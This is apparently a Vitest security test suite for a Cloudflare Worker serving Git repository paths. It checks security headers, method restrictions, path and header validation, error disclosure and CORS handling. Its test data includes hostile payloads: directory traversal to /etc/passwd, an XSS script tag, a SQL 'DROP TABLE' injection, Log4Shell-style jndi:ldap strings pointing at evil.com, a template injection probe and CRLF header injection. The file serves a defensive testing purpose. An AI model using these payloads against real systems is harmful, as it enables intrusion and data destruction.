import { SELF } from 'cloudflare:test';
import { describe, expect, it } from 'vitest';

describe('Security Features', () => {
  describe('Security Headers', () => {
    it('should include Strict-Transport-Security header', async () => {
      const response = await SELF.fetch('https://example.com/');

      const hsts = response.headers.get('Strict-Transport-Security');
      expect(hsts).toBeTruthy();
      expect(hsts).toContain('max-age=');
      expect(hsts).toContain('includeSubDomains');
      expect(hsts).toContain('preload');
    });

    it('should include X-Frame-Options header', async () => {
      const response = await SELF.fetch('https://example.com/');

      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
    });

    it('should include X-XSS-Protection header', async () => {
      const response = await SELF.fetch('https://example.com/');

      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
    });

    it('should include Content-Security-Policy header', async () => {
      const response = await SELF.fetch('https://example.com/');

      const csp = response.headers.get('Content-Security-Policy');
      expect(csp).toBeTruthy();
      expect(csp).toContain("default-src 'none'");
    });

    it('should include Referrer-Policy header', async () => {
      const response = await SELF.fetch('https://example.com/');

      expect(response.headers.get('Referrer-Policy')).toBe('strict-origin-when-cross-origin');
    });

    it('should include Permissions-Policy header', async () => {
      const response = await SELF.fetch('https://example.com/');

      const permissionsPolicy = response.headers.get('Permissions-Policy');
      expect(permissionsPolicy).toBeTruthy();
      expect(permissionsPolicy).toContain('interest-cohort=()');
    });
  });

  describe('HTTP Method Restrictions', () => {
    it('should reject PATCH method', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo', {
        method: 'PATCH'
      });

      expect(response.status).toBe(405);
    });

    it('should reject PUT method for non-Git requests', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo/file.txt', {
        method: 'PUT'
      });

      expect(response.status).toBe(405);
    });

    it('should reject DELETE method', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo', {
        method: 'DELETE'
      });

      expect(response.status).toBe(405);
    });

    it('should reject OPTIONS method', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo', {
        method: 'OPTIONS'
      });

      expect(response.status).toBe(405);
    });
  });

  describe('Path Validation', () => {
    it('should reject paths with directory traversal attempts', async () => {
      const maliciousPaths = [
        '/gh/../../../etc/passwd',
        '/gh/user/repo/../../../sensitive',
        '/gh/user/repo/..%2F..%2F..%2Fetc%2Fpasswd',
        '/gh/user/repo/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const path of maliciousPaths) {
        const response = await SELF.fetch(`https://example.com${path}`);
        // Should either reject with 400 or safely handle the path
        expect([400, 404, 500]).toContain(response.status);
      }
    });

    it('should reject extremely long paths', async () => {
      const longPath = `/gh/${'a'.repeat(3000)}`;
      const response = await SELF.fetch(`https://example.com${longPath}`);

      expect(response.status).toBe(414);
    });

    it('should handle URL encoding safely', async () => {
      const encodedPaths = [
        '/gh/user/repo%20with%20spaces',
        '/gh/user/repo%2Ffile.txt',
        '/gh/user%40domain/repo'
      ];

      for (const path of encodedPaths) {
        const response = await SELF.fetch(`https://example.com${path}`);
        // Should handle encoded paths without security issues
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Input Sanitization', () => {
    it('should handle special characters in paths', async () => {
      const specialPaths = [
        '/gh/user/repo<script>alert(1)</script>',
        "/gh/user/repo'; DROP TABLE users; --",
        '/gh/user/repo${jndi:ldap://evil.com}',
        '/gh/user/repo{{7*7}}'
      ];

      for (const path of specialPaths) {
        const response = await SELF.fetch(`https://example.com${path}`);
        // Should safely handle special characters
        expect(response.status).not.toBe(500);
      }
    });

    it('should handle Unicode characters safely', async () => {
      const unicodePaths = [
        '/gh/所有者/存储库/文件.txt',
        '/gh/user/repo/файл.txt',
        '/gh/user/repo/ファイル.txt'
      ];

      for (const path of unicodePaths) {
        const response = await SELF.fetch(`https://example.com${path}`);
        // Should handle Unicode without issues
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Request Header Validation', () => {
    it('should handle malicious User-Agent headers', async () => {
      const maliciousUserAgents = [
        '<script>alert(1)</script>',
        'Mozilla/5.0 ${jndi:ldap://evil.com}',
        'User-Agent\r\nX-Injected-Header: malicious'
      ];

      for (const userAgent of maliciousUserAgents) {
        const response = await SELF.fetch('https://example.com/gh/test/repo', {
          headers: {
            'User-Agent': userAgent
          }
        });

        // Should handle malicious user agents safely
        expect(response.status).not.toBe(500);
      }
    });

    it('should handle header injection attempts', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo', {
        headers: {
          'X-Test': 'value\r\nX-Injected: malicious',
          Referer: 'https://evil.com\r\nX-Injected: header'
        }
      });

      // Should not allow header injection
      expect(response.headers.get('X-Injected')).toBeNull();
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle concurrent requests gracefully', async () => {
      const requests = Array(10)
        .fill()
        .map(() => SELF.fetch('https://example.com/gh/test/repo/small-file.txt'));

      const responses = await Promise.all(requests);

      // All requests should be handled without errors
      responses.forEach(response => {
        expect(response.status).not.toBe(500);
      });
    });

    it('should timeout long-running requests', async () => {
      // This test would need to be implemented based on actual timeout behavior
      // For now, we just verify the request doesn't hang indefinitely
      const startTime = Date.now();

      try {
        await SELF.fetch('https://example.com/gh/test/very-large-file', {
          signal: AbortSignal.timeout(35000) // Slightly longer than expected timeout
        });
      } catch (error) {
        // Request should timeout or complete within reasonable time
        const elapsed = Date.now() - startTime;
        expect(elapsed).toBeLessThan(40000); // 40 seconds max
      }
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose internal error details', async () => {
      const response = await SELF.fetch('https://example.com/invalid-platform/test');

      expect(response.status).toBe(400);

      const body = await response.text();
      // Should not expose internal paths, stack traces, or sensitive info
      expect(body).not.toMatch(/\/[a-zA-Z]:[\\\/]/); // Windows paths
      expect(body).not.toMatch(/\/home\/[^\/]+/); // Unix home paths
      expect(body).not.toMatch(/at [a-zA-Z]+\.[a-zA-Z]+/); // Stack traces
      expect(body).not.toMatch(/Error: .+ at/); // Detailed error messages
    });

    it('should provide generic error messages', async () => {
      const response = await SELF.fetch('https://example.com/invalid');

      const body = await response.text();
      // Error messages should be generic and safe
      expect(body.length).toBeLessThan(200); // Not too verbose
      expect(body).not.toContain('undefined');
      expect(body).not.toContain('null');
    });
  });

  describe('CORS Security', () => {
    it('should handle CORS preflight requests securely', async () => {
      const response = await SELF.fetch('https://example.com/gh/test/repo', {
        method: 'OPTIONS',
        headers: {
          Origin: 'https://evil.com',
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'X-Custom-Header'
        }
      });

      // Should either reject OPTIONS or handle CORS securely
      if (response.status === 200) {
        const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
        // Should not blindly allow all origins for sensitive operations
        expect(allowOrigin).not.toBe('https://evil.com');
      }
    });
  });

  describe('Content Type Security', () => {
    it('should not execute uploaded content', async () => {
      // Test that the service doesn't execute or interpret uploaded content
      const response = await SELF.fetch('https://example.com/gh/test/repo/script.js');

      // Should serve content with appropriate headers, not execute it
      const contentType = response.headers.get('Content-Type');
      if (contentType) {
        expect(contentType).not.toContain('text/html');
        expect(contentType).not.toContain('application/javascript');
      }
    });
  });
});
